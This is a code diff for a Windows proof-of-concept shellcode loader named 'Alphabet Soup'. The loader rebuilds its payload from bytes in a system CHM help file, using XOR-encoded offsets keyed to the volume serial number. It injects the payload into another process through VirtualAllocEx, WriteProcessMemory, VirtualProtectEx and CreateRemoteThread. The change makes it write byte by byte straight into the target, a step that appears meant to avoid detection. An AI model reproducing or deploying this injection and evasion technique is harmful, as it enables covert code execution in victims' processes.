@@ -5,7 +5,6 @@
 * Usage: remote-injection.exe <PID>
 */
 #include <windows.h>
-#include <vector>
 #include <stdio.h>
 
 // payload recipe (276 bytes)
@@ -43,65 +42,57 @@ int main(int argc, char* argv[]) {
     }
 
     DWORD targetPid = atoi(argv[1]);
-    printf("[*] Alphabet Soup PoC Remote Loader (Targeting PID: %d)\n", targetPid);
+    printf("[*] Alphabet Soup PoC Remote Direct Loader (PID: %d)\n", targetPid);
 
-    // 1. Environmental Key Retrieval
+    // 1. Environmental Key
     DWORD soupKey = 0;
     GetVolumeInformationA("C:\\", NULL, 0, &soupKey, NULL, NULL, NULL, 0);
-    printf("[+] XOR Key: 0x%08X\n", soupKey);
 
-    // 2. Dictionary Mapping (cliconf.chm)
+    // 2. Dictionary Mapping
     HANDLE hFile = CreateFileA("C:\\Windows\\Help\\mui\\0409\\cliconf.chm", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     HANDLE hMap = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
     LPVOID pChmBase = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
 
-    // 3. The Harvest (Assemble locally in a vector)
-    printf("[*] Harvesting soup from dictionary...\n");
-    std::vector<BYTE> localBowl(soupSize);
-    for (size_t i = 0; i < soupSize; i++) {
-        unsigned long long realOffset = alphabetSoup[i] ^ soupKey;
-        localBowl[i] = *((BYTE*)pChmBase + (DWORD)realOffset);
-    }
-
-    // 4. Verification Check
-    if (localBowl[0] != 0xFC) {
-        printf("[!] Integrity failure! First byte: 0x%02X (Expected 0xFC)\n", localBowl[0]);
-        return 1;
-    }
-    printf("[+] Soup assembled and verified locally.\n");
-
-    // 5. Remote Injection Workflow
-    printf("[*] Opening target process...\n");
+    // 3. Open Process and Allocate
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
     if (!hProcess) {
-        printf("[!] Failed to open process. Error: %d\n", GetLastError());
+        printf("[!] Failed to open process: %d\n", GetLastError());
         return 1;
     }
 
-    // Allocate remote "bowl"
     LPVOID pRemoteBowl = VirtualAllocEx(hProcess, NULL, soupSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     printf("[+] Remote memory allocated at 0x%p\n", pRemoteBowl);
 
-    // Write the assembled soup to the remote process
-    if (!WriteProcessMemory(hProcess, pRemoteBowl, localBowl.data(), soupSize, NULL)) {
-        printf("[!] Failed to write memory.\n");
-        return 1;
+    // 4. THE DIRECT HARVEST: Decode and Write in one pass
+    printf("[*] Decoding indices and writing directly to remote process...\n");
+    for (size_t i = 0; i < soupSize; i++) {
+        // Decode the index
+        unsigned long long realOffset = alphabetSoup[i] ^ soupKey;
+        BYTE targetByte = *((BYTE*)pChmBase + (DWORD)realOffset);
+
+        // Calculate remote write destination (Base + offset)
+        LPVOID remoteDest = (LPVOID)((BYTE*)pRemoteBowl + i);
+
+        // Write a single byte directly to the remote process
+        if (!WriteProcessMemory(hProcess, remoteDest, &targetByte, 1, NULL)) {
+            printf("[!] Failed to write byte at index %zu\n", i);
+            break;
+        }
     }
 
-    // Flip permissions to Execute
+    // 5. Execute
     DWORD oldProtect;
     VirtualProtectEx(hProcess, pRemoteBowl, soupSize, PAGE_EXECUTE_READ, &oldProtect);
-
-    // Trigger execution
-    printf("[!] Triggering Remote Thread...\n");
+    
+    printf("[!] Launching Remote Thread...\n");
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBowl, NULL, 0, NULL);
 
     if (hThread) {
-        printf("[+] Thread launched. Check for Calc!\n");
+        printf("[+] Thread launched successfully.\n");
         CloseHandle(hThread);
     }
 
-    // Cleanup local resources
+    // Cleanup
     CloseHandle(hProcess);
     UnmapViewOfFile(pChmBase);
     CloseHandle(hMap);
